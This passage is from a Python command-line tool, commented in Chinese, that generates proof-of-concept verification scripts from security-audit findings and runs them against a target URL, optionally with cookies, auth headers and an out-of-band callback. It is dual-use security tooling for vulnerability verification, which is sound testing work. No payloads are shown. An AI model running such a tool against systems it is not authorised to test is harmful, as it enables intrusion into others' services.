            'templateKey': template_key,
            'endpoint': endpoint,
        })

    # 拼接完整脚本
    script = header
    script += "\n# " + "=" * 75 + "\n"
    script += "# POC 验证函数\n"
    script += "# " + "=" * 75 + "\n\n"

    for func_code in functions:
        script += func_code + "\n\n"

    # 生成运行器（包含注册表）
    # 注意：_SCRIPT_RUNNER 模板使用 {{ }} 作为转义，需要替换为单花括号
    registry_json = json.dumps(poc_registry, ensure_ascii=False, indent=4)
    runner = _SCRIPT_RUNNER.replace('{poc_registry}', registry_json)
    # 将模板中的双花括号替换为单花括号
    runner = runner.replace('{{', '{').replace('}}', '}')
    script += runner

    return script


# ---------------------------------------------------------------------------
# 子命令: generate
# ---------------------------------------------------------------------------

def run_generate(batch_dir, input_file=None, output_dir=None):
    """生成 POC 验证脚本和清单。

    Args:
        batch_dir: 审计批次目录
        input_file: 输入文件路径（默认自动检测 score-results.json / merged-scan.json / finding-*.json）
        output_dir: 输出目录（默认 batch_dir）
    """
    batch_path = Path(batch_dir)
    out_path = Path(output_dir) if output_dir else batch_path

    # 加载 findings
    findings = []
    source_file = ''

    if input_file:
        fp = Path(input_file) if os.path.isabs(input_file) else batch_path / input_file
        data = load_json_file(fp)
        if data:
            findings = data.get('findings', data.get('RiskList', []))
            source_file = str(fp.name)
            log_info(f"从 {fp.name} 加载 {len(findings)} 个 findings")
    else:
        # 自动检测输入源（优先级：score-results > merged-scan > finding-*.json）
        for candidate in [
            'score-results.json',
            'merged-scan.json',
        ]:
            data = load_json_file(batch_path / candidate)
            if data and data.get('findings'):
                findings = data['findings']
                source_file = candidate
                log_info(f"从 {candidate} 加载 {len(findings)} 个 findings")
                break

        # 回退到 finding-*.json 文件
        if not findings:
            for fp in sorted(batch_path.glob('finding-*.json')):
                data = load_json_file(fp)
                if data:
                    risk_list = data.get('RiskList', data.get('issues', []))
                    findings.extend(risk_list)
            if findings:
                source_file = 'finding-*.json'
                log_info(f"从 finding-*.json 文件加载 {len(findings)} 个 findings")

    if not findings:
        log_warn("未找到任何 findings，跳过 POC 生成")
        stdout_json({"status": "skip", "message": "no findings found"})
        return

    # 按严重性排序（高优先）
    findings.sort(key=lambda f: SEVERITY_ORDER.get(
        (f.get('severity') or f.get('RiskLevel') or 'low').lower(), 0
    ), reverse=True)

    # 生成 POC 清单
    manifest = build_poc_manifest(findings)
    log_info(f"已生成 {len(manifest)} 条 POC 清单")

    # 统计各模板使用情况
    template_stats = {}
    for entry in manifest:
        tk = entry['templateKey']
        template_stats[tk] = template_stats.get(tk, 0) + 1
    for tk, cnt in sorted(template_stats.items(), key=lambda x: -x[1]):
        log_info(f"  {tk}: {cnt} 个 POC")

    # 获取 batch_id
    batch_id = batch_path.name

    # 生成 POC 脚本
    script_content = generate_poc_script(manifest, batch_id=batch_id)
    script_path = out_path / 'poc-scripts.py'
    script_path.parent.mkdir(parents=True, exist_ok=True)
    with open(script_path, 'w', encoding='utf-8') as f:
        f.write(script_content)
    # 设置可执行权限
    os.chmod(script_path, 0o755)
    log_ok(f"POC 脚本已生成: {script_path}")

    # 生成 POC 清单 JSON
    manifest_data = {
        'generatedAt': datetime.now(timezone.utc).isoformat(),
        'batchId': batch_id,
        'sourceFile': source_file,
        'totalFindings': len(findings),
        'totalPocs': len(manifest),
        'templateStats': template_stats,
        'usage': {
            'description': 'POC 验证脚本使用说明',
            'runAll': f'python3 poc-scripts.py --base-url http://your-target:8080',
            'runWithAuth': f'python3 poc-scripts.py --base-url http://your-target:8080 --cookie "session=abc" --header "Authorization: Bearer <token>"',
            'runSingle': f'python3 poc-scripts.py --base-url http://your-target:8080 --finding f-001',
            'saveResults': f'python3 poc-scripts.py --base-url http://your-target:8080 --output poc-results.json',
        },
        'manifest': manifest,
    }
    manifest_path = out_path / 'poc-manifest.json'
    write_json_file(manifest_path, manifest_data)
    log_ok(f"POC 清单已生成: {manifest_path}")

    # stdout 摘要
    stdout_json({
        "status": "ok",
        "totalFindings": len(findings),
        "totalPocs": len(manifest),
        "templateStats": template_stats,
        "scriptFile": "poc-scripts.py",
        "manifestFile": "poc-manifest.json",
        "usage": f"python3 {script_path} --base-url http://your-target:8080",
    })


# ---------------------------------------------------------------------------
# 子命令: run
# ---------------------------------------------------------------------------

def run_poc(batch_dir, base_url, finding_filter=None, cookie=None,
            headers_list=None, callback_url=None, output_file=None):
    """执行 POC 验证（调用生成的脚本）。

    此函数通过子进程执行 poc-scripts.py，收集结果并更新 poc-manifest.json。
    """
    import subprocess

    batch_path = Path(batch_dir)
    script_path = batch_path / 'poc-scripts.py'

    if not script_path.exists():
        log_error(f"POC 脚本不存在: {script_path}，请先执行 generate 子命令")
        stdout_json({"status": "error", "message": "poc-scripts.py not found"})
        sys.exit(1)

    cmd = [sys.executable, str(script_path), '--base-url', base_url]
    if finding_filter:
        for fid in finding_filter:
            cmd.extend(['--finding', fid])
    if cookie:
        cmd.extend(['--cookie', cookie])
    if headers_list:
        for h in headers_list:
            cmd.extend(['--header', h])
    if callback_url:
        cmd.extend(['--callback-url', callback_url])

    out_file = output_file or str(batch_path / 'poc-results.json')
    cmd.extend(['--output', out_file])

    log_info(f"执行 POC 脚本: {' '.join(cmd[:4])}...")

    try:
        result = subprocess.run(cmd, capture_output=False, text=True, timeout=300)
        if result.returncode == 0:
            log_ok(f"POC 验证完成，结果已保存: {out_file}")
            # 读取结果并输出摘要
            poc_results = load_json_file(out_file)
            if poc_results:
                stdout_json({
                    "status": "ok",
                    "totalTested": poc_results.get('totalTested', 0),
                    "suspiciousCount": poc_results.get('suspiciousCount', 0),
                    "outputFile": os.path.basename(out_file),
                })
            else:
                stdout_json({"status": "ok", "outputFile": os.path.basename(out_file)})
        else:
            log_error(f"POC 脚本执行失败，返回码: {result.returncode}")
            stdout_json({"status": "error", "message": f"exit code {result.returncode}"})
    except subprocess.TimeoutExpired:
        log_error("POC 脚本执行超时（300s）")
        stdout_json({"status": "error", "message": "timeout"})
    except Exception as e:
        log_error(f"POC 脚本执行异常: {e}")
        stdout_json({"status": "error", "message": str(e)})


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description='POC 验证脚本生成器：为审计发现的漏洞生成可执行的验证脚本',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
子命令说明：
  generate   读取审计结果，为每个漏洞生成 POC 验证脚本和清单
  run        执行生成的 POC 脚本，对目标服务发送实际验证请求

示例：
  # 生成 POC 脚本
  %(prog)s generate --batch-dir security-scan-output/project-deep-20260407120000

  # 从指定输入文件生成
  %(prog)s generate --batch-dir security-scan-output/project-deep-20260407120000 --input merged-scan.json

  # 执行 POC 验证
  %(prog)s run --batch-dir security-scan-output/project-deep-20260407120000 --base-url http://localhost:8080

  # 带认证执行
  %(prog)s run --batch-dir security-scan-output/project-deep-20260407120000 \\
    --base-url http://localhost:8080 \\
    --cookie "session=abc123" \\
    --header "Authorization: Bearer xxx"

  # 仅验证指定漏洞
  %(prog)s run --batch-dir security-scan-output/project-deep-20260407120000 \\
    --base-url http://localhost:8080 --finding f-001 --finding f-002
        """
    )
    subparsers = parser.add_subparsers(dest='command')

    # generate
    sp_gen = subparsers.add_parser('generate',
                                    help='生成 POC 验证脚本和清单')
    sp_gen.add_argument('--batch-dir', required=True,
                        help='审计批次目录路径')
    sp_gen.add_argument('--input', default=None,
                        help='输入文件路径（默认自动检测 score-results.json / merged-scan.json）')
    sp_gen.add_argument('--output-dir', default=None,
                        help='输出目录（默认与 batch-dir 相同）')

    # run
    sp_run = subparsers.add_parser('run',
                                    help='执行 POC 验证脚本')
    sp_run.add_argument('--batch-dir', required=True,
                        help='审计批次目录路径')
    sp_run.add_argument('--base-url', required=True,
                        help='目标服务基础 URL（如 http://localhost:8080）')
    sp_run.add_argument('--finding', action='append', default=None,
                        help='仅验证指定 findingId（可多次指定）')
    sp_run.add_argument('--cookie', default=None,
                        help='Cookie 字符串')
    sp_run.add_argument('--header', action='append', default=None,
                        help='自定义请求头（可多次指定）')
    sp_run.add_argument('--callback-url', default=None,
                        help='带外回调 URL（OOB 探测用）')
    sp_run.add_argument('--output', default=None,
                        help='验证结果输出文件路径')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(1)

    if args.command == 'generate':
        batch_dir = Path(args.batch_dir)
        if not batch_dir.is_dir():
            log_error(f"批次目录不存在: {batch_dir}")
            stdout_json({"status": "error", "message": f"batch dir not found: {batch_dir}"})
            sys.exit(1)
        run_generate(batch_dir, input_file=getattr(args, 'input', None),
                     output_dir=getattr(args, 'output_dir', None))

    elif args.command == 'run':
        batch_dir = Path(args.batch_dir)
        if not batch_dir.is_dir():
            log_error(f"批次目录不存在: {batch_dir}")
            stdout_json({"status": "error", "message": f"batch dir not found: {batch_dir}"})
            sys.exit(1)
        run_poc(batch_dir, base_url=args.base_url,
                finding_filter=args.finding, cookie=args.cookie,
                headers_list=args.header, callback_url=args.callback_url,
                output_file=args.output)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        log_warn("用户中断操作")
        sys.exit(130)
    except Exception as e:
        log_error(f"未预期的错误: {e}")
        import traceback
        traceback.print_exc(file=sys.stderr)
        stdout_json({"status": "error", "message": str(e)})
        sys.exit(1)
